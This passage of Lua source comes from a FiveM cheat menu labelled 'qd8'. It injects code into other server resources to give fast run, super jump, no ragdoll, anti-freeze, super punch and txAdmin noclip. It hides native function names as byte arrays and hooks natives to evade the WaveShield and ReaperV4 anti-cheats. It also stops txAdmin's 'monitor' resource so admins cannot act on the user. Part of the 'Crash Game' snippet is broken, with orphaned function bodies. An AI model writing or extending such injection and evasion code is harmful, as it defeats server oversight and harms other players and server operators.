                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]
                                        )
                                    end
                                else
                                    qd8:Notify("error", "qd8", "Fast Run Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any", [[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "checkbox", label = "Super Jump", checked = false,
                            onSelect = function(checked)
                                local WaveDih = GetResourceState("WaveShield") == "started"

                                local function decode(tbl)
                                    local s = ""
                                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                    return s
                                end

                                local function g(n)
                                    return _G[decode(n)]
                                end

                                local function enableSuperJump()
                                    if not _G.superJumpEnabled then
                                        _G.superJumpEnabled = true
                                        g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                            while _G.superJumpEnabled do
                                                g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                Wait(0)
                                            end
                                        end)
                                    end
                                end

                                local function disableSuperJump()
                                    _G.superJumpEnabled = false
                                    g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                end

                                if checked then
                                    if WaveDih then
                                        enableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    end
                                else
                                    if WaveDih then
                                        print("off")
                                        disableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]])
                                    end
                                end
                            end
                        },


                    }
                },
                {
                    label = "Miscellaneous",
                    tabs = {
                        { icon = "", type = "button", label = "Crash Game", desc = "Crashes your game",
                            onSelect = function()
                        MachoInjectResourceRaw("any", [[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]])
                            end
                        },
                        { icon = "", type = "button", label = "Clear Screen Effects", desc = "Removes all screen effects",
                            onSelect = function()
                                print("Revive")
                            end
                        },
                        { icon = "", type = "button", label = "Suicide", desc = "This will kill you.",
                            onSelect = function()
                            local function RGybF0JqEt()
                                local aSdFgHjKlQwErTy = SetEntityHealth
                                aSdFgHjKlQwErTy(PlayerPedId(), 0)
                            end
                            RGybF0JqEt()
                        end
                        },
                        { icon = "", type = "button", label = "Force Ragdoll", desc = "This will ragdoll.",
                            onSelect = function()
                            MachoInjectResourceRaw("any", [[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]])
                            end
                        },
                        { icon = "", type = "button", label = "Remove Crutch", desc = "Remove Crutch is the server is using the correct resource",
                            onSelect = function()
                            MachoResourceStop("wasabi_crutch")
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Primary", "Secondary" }, label = "Clear Tasks", desc = "Clears the character's tasks",
                            onSelect = function(value)
                                if value == "Primary" then
                                    ClearPedTasksImmediately(PlayerPedId())
                                else
                                    if value == "Secondary" then
                                    ClearPedSecondaryTask(PlayerPedId())
                                end
                            end
                        end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "No Ragdoll",
                            checked = false,
                            desc = "This will prevent you from being ragdolled from admins or cheaters.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "No Ragdoll Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]])
                                        qd8:Notify("success", "qd8", "No Ragdoll Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "No Ragdoll Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            noRagdollEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            noRagdollEnabled = false
                                        ]])
                                        qd8:Notify("success", "qd8", "No Ragdoll Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Freeze",
                            checked = false,
                            desc = "This will prevent you from being frozen.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "Anti-Freeze Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]])
                                        qd8:Notify("success", "qd8", "Anti-Freeze Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then 
                                        qd8:Notify("error", "qd8", "Anti-Freeze Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            antiFreezeEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            antiFreezeEnabled = false
                                        ]])
                                        qd8:Notify("error", "qd8", "Anti-Freeze Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        { type = "checkbox", label = "Force Third Person", checked = false, desc = "This will force third person.",
                            onSelect = function(checked)
                                if checked then
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]])
                                else
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Force Driveby", checked = false, desc = "This will enable driveby if disabled.",
                            onSelect = function(checked)
                                if checked then
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]])
                                else
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Infinite Stamina",
                            checked = false,
                            desc = "This will enable Infinite Stamina.",
                            onSelect = function(checked)
                                if checked then
                                    qd8:Notify("success", "qd8", "Infinite Stamina On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]])
                                    end
                                else
                                    qd8:Notify("error", "qd8", "Infinite Stamina Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.infiniteStaminaEnabled = false
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.infiniteStaminaEnabled = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Tiny Ped",
                            checked = false,
                            desc = "This will turn you into a tiny ped.",
                            onSelect = function(checked)
                                local injectTarget =
                                    (GetResourceState("WaveShield") == "started" and "WaveShield") or
                                    (GetResourceState("monitor") == "started" and "monitor") or
                                    (GetResourceState("ox_lib") == "started" and "ox_lib") or
                                    "any"

                                if checked then
                                    Injection(injectTarget, [[
                                        if not _G.qd8TinyPedInjected then
                                            _G.qd8TinyPedInjected = true
                                            _G.qd8TinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.qd8TinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]])
                                else
                                    Injection(injectTarget, [[
                                        _G.qd8TinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Punch",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "Super Punch Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]])
                                        qd8:Notify("success", "qd8", "Super Punch Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        qd8:Notify("error", "qd8", "Super Punch Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            superPunchEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            superPunchEnabled = false
                                        ]])
                                        qd8:Notify("error", "qd8", "Super Punch Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        { type = "divider", label = "txAdmin Options" },
                        { type = "checkbox", label = "txAdmin Player IDs", checked = false, desc = "This will toggle txAdmin Player ids.",
                            onSelect = function(checked)
                                -- if GetResourceState("WaveShield") == "started" then
                                --     qd8:Notify("error", "qd8", "Ban Prevention: Cannot Use this on WaveShield", 3000)
                                --     return
                                -- end

                                if checked then
                                MachoInjectResource2(AsThreadNs, 'monitor', [[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]])
                                else
                                MachoInjectResource2(AsThreadNs, 'monitor', [[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Noclip",
                            checked = false,
                            desc = "This will toggle txAdmin noclip.",
                            onSelect = function(checked)
                                -- if GetResourceState("ReaperV4") == "started" or GetCurrentServerEndpoint() ~= "216.146.24.88:30120" then
                                --     qd8:Notify("error", "qd8", "Ban Prevention: Cannot Use this on ReaperV4", 3000)
                                --     return
                                -- end

                                if checked then
                                    if GetResourceState("WaveShield") == "started" then
                                        TriggerEvent("txcl:setPlayerMode", "noclip", true)
                                    else
                                        MachoInjectResource2(3, "monitor", [[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]])
                                    end
                                else
                                    if GetResourceState("WaveShield") == "started" then
                                        TriggerEvent("txcl:setPlayerMode", "none", true)
                                    else
                                        MachoInjectResource2(3, "monitor", [[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Disable All txAdmin", checked = false, desc = "This will disable txAdmin options from admins using them against you.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },                        
                        { type = "checkbox", label = "Disable txAdmin Teleport", checked = false, desc = "This will disable txAdmin Teleport.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },
                        { type = "checkbox", label = "Disable txAdmin Freeze", checked = false, desc = "This will disable txAdmin Freeze.",
                            onSelect = function(checked)
                                if checked then
